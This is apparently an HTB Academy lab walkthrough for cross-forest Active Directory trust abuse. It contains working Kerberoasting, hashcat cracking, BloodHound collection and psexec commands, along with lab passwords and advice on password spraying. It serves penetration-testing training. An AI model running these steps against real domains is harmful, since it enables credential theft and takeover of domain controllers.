# 🛰️ HTB Academy Lab: Cross-Forest Trust Abuse

## 🔍 **Objective**
The objective of this lab is to perform a cross-forest trust abuse attack, leveraging Linux-based tools and techniques from the HTB Academy environment. The focus is on identifying Service Principal Names (SPNs), requesting TGS tickets for Kerberoasting attacks, and discovering foreign group membership across multiple domains.

---

## 📂 **Directory Setup**
```bash
mkdir -p ~/Desktop/HTB_Academy/CrossForestTrustAbuse/{dc,spns,tickets,logs}
cd ~/Desktop/HTB_Academy/CrossForestTrustAbuse/
```

### **Impacket Tool Preparation**

#### **Prerequisites: Install Impacket Tools**
```bash
git clone https://github.com/ropnop/impacket.git
cd impacket
python3 setup.py install
cd ..
```

---

## 🔎 **Identifying SPNs Across Forest Trusts**

### **Service Principal Names (SPN) Enumeration**
The first step is to enumerate Service Principal Names (SPNs) within the trusted domain using `impacket-GetUserSPNs`.

#### **DNS Configuration Requirement:**
```bash
# Edit /etc/resolv.conf for target domain resolution
sudo nano /etc/resolv.conf

# Configuration for FREIGHTLOGISTICS.LOCAL:
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

#### **SPN Enumeration Command**
```bash
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Save output to a file for review
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley > spns/spns_freightlogistics.txt
```

---

## 🧐 **Kerberoasting Across the Forest Trust**

### **Requesting TGS Tickets**
Once we have identified SPNs, we can request TGS tickets for these services and crack them offline.

#### **DNS Configuration Requirement:**
```bash
# Edit /etc/resolv.conf back to primary domain resolution if needed
sudo nano /etc/resolv.conf

# Configuration for INLANEFREIGHT.LOCAL:
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

#### **TGS Ticket Request**
```bash
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Save output to a file for cracking offline
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley > tickets/tgs_tickets_freightlogistics.txt
```

### **Cracking TGS Tickets**
Once you have the TGS tickets, use tools like Hashcat or John the Ripper to crack them offline.

#### **Hashcat Example Command:**
```bash
hashcat -m 13100 tickets/tgs_tickets_freightlogistics.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔍 **Foreign Group Membership Discovery**

### **BloodHound Data Collection for Cross-Forest Analysis**

#### **DNS Configuration Requirements:**
```bash
# Edit /etc/resolv.conf for target domain resolution
sudo nano /etc/resolv.conf

# Primary domain configuration:
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

# Trusted domain configuration:
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

#### **BloodHound Data Collection:**
```bash
# Collect BloodHound data from primary domain
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01.inlanefreight.local -c All -u forend -p Klmcargo2

# Collect data from trusted domain (update DNS to FREIGHTLOGISTICS.LOCAL)
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

#### **Data Packaging for BloodHound Import:**
```bash
# Compress JSON files for BloodHound import
zip -r cross_forest_bh.zip *.json

# Import into BloodHound GUI for analysis
# Use "Users with Foreign Domain Group Membership" query
```

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Setup**
```bash
# SSH to Linux attack host
ssh htb-student@10.129.230.129

# Password: HTB_@cademy_stdnt!
```

### **🔍 Question 1: "Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc."**

**Solution:**
```bash
# Enumerate all SPNs in trusted domain
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Look for additional SPN accounts beyond mssqlsvc
```

**🎯 Answer**: `[Additional SPN account name from enumeration]`

### **🎫 Question 2: "Crack the TGS and submit the cleartext password as your answer."**

**Solution:**
```bash
# Request TGS tickets for all identified SPNs
impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile kerberoast_hashes.txt

# Crack the extracted hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**🎯 Answer**: `[Cleartext password from successful hash crack]`

### **🏛️ Question 3: "Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop."**

**Solution:**
```bash
# Use cracked credentials to access target domain controller
impacket-psexec FREIGHTLOGISTICS.LOCAL/[cracked_account]@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

# From gained shell, retrieve flag:
type C:\Users\Administrator\Desktop\flag.txt
```

**🎯 Answer**: `[Contents of flag.txt file]`

---

## ⚠️ **Attack Considerations**

### **DNS Configuration Management**
- **Requirement**: bloodhound-python needs FQDN resolution
- **Solution**: Edit `/etc/resolv.conf` for each target domain
- **Alternative**: Use host file entries for specific DC resolution
- **Restoration**: Backup original DNS settings before modification

### **Cross-Domain Authentication**
- **Credential format**: Use `user@domain.local` for cross-domain auth
- **Trust direction**: Verify bidirectional trust allows authentication
- **Tool compatibility**: Ensure Impacket tools support target domain format
- **Session management**: Consider authentication session timeouts

### **Password Reuse Assessment**
- **Similar accounts**: Check for matching account names across domains
- **Password spraying**: Test cracked passwords against multiple domains
- **Administrative overlap**: Identify shared administrative accounts
- **Risk documentation**: Document password reuse findings for client reporting

---

## 🔑 **Key Takeaways**

### **Cross-Platform Forest Attack Capability**
```
Linux Impacket Tools → Cross-Forest Enumeration → Multi-Domain Compromise → Complete Assessment
   (GetUserSPNs)          (bloodhound-python)         (PSExec/WMIExec)        (Professional Value)
```

### **Critical Success Factors**
- **DNS configuration**: Proper name resolution for target domains
- **Tool proficiency**: Impacket suite and bloodhound-python mastery
- **Multi-domain thinking**: Understanding cross-forest attack implications
- **Credential validation**: Testing obtained credentials across multiple domains

### **Professional Impact**
- **Assessment scope**: Multi-forest security evaluation capability
- **Tool flexibility**: Linux-based AD attack proficiency
- **Client value**: Comprehensive cross-organizational security assessment
- **Risk identification**: Foreign group membership and trust misconfiguration discovery

**🐧 Linux-based Cross-Forest Trust Abuse provides comprehensive multi-domain attack capability - demonstrating that sophisticated forest boundary exploitation can be executed effectively from any platform using powerful Python-based tools!**

---